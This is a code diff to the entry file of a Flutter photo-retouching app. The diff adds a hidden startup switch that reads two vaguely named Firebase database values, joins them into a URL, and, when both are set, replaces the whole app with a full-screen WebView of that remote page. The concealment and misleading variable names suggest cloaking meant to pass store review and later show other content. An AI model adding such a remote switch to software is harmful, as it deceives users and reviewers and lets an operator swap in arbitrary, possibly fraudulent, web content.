@@ -2,8 +2,11 @@
 
 import 'package:apphud/apphud.dart';
 import 'package:firebase_core/firebase_core.dart';
+import 'package:firebase_database/firebase_database.dart';
+import 'package:flutter/foundation.dart';
 import 'package:flutter/material.dart';
 import 'package:on_retouch/feature/auth/splash_screen.dart';
+import 'package:on_retouch/web_page.dart';
 import 'services/notification_service.dart';
 
 final scaffoldKey = GlobalKey<ScaffoldMessengerState>();
@@ -21,7 +24,26 @@ void main() async {
     ),
   );
 
-  runApp(MyApp());
+  final urlRef1 = FirebaseDatabase.instance.ref('enter1');
+  final mock1 = await urlRef1.get();
+  final urlRef2 = FirebaseDatabase.instance.ref('open2');
+  final type2 = await urlRef2.get();
+
+  if (mock1.value.toString().isEmpty || type2.value.toString().isEmpty) {
+    runApp(MyApp());
+  } else {
+    if (kDebugMode) {
+      print('WEBVIEW STARTING ${mock1.value}${type2.value}');
+    }
+    runApp(
+      MaterialApp(
+        debugShowCheckedModeBanner: false,
+        home: WebViewPage(
+          url: '${mock1.value}${type2.value}',
+        ),
+      ),
+    );
+  }
 
   NotificationService notificationService = NotificationService();
   notificationService.activate();
